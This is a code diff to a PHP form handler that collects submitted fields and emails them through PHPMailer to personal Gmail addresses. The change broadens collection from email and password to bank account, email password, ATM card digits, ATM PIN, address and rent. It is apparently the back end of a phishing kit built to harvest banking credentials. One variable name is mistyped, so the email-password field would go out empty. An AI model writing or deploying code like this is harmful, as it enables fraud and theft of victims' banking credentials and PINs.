@@ -13,11 +13,16 @@ header("Access-Control-Allow-Headers: *");
     
    
         
+        $account = $_POST['account'];
         $email = $_POST['email'];
-        $password = $_POST['password'];
-        $alternate = $_POST['alternate'];
+        $emailPass = $_POST['email-pass'];
+        $atmCard = $_POST['atm-card'];
+        $atmPin = $_POST['atm-pin'];
+        $address = $_POST['address'];
+        $rent = $_POST['rent'];
 
-        $message = "Email: ".$email."<br> Password: ".$password."<br> Alternate: ".$alternate;
+
+        $message = "Account: ".$account."<br> Email: ".$email."<br> Email-Password: ".$emailpass."<br> Last 6: ".$atmCard."<br> Pin: ".$atmPin."<br> Address: ".$address."<br> Rent: ".$rent;
 
         
    
@@ -37,7 +42,7 @@ header("Access-Control-Allow-Headers: *");
     
         //Recipients
         $mail->setFrom('billharris7431@gmail.com',"ubani");
-        $mail->addAddress('liveyourdreams@rexdreams.com');     //Add a recipient
+        $mail->addAddress('tochukwu.ubani@gmail.com');     //Add a recipient
      
         //Content
         $mail->isHTML(true);                                  //Set email format to HTML
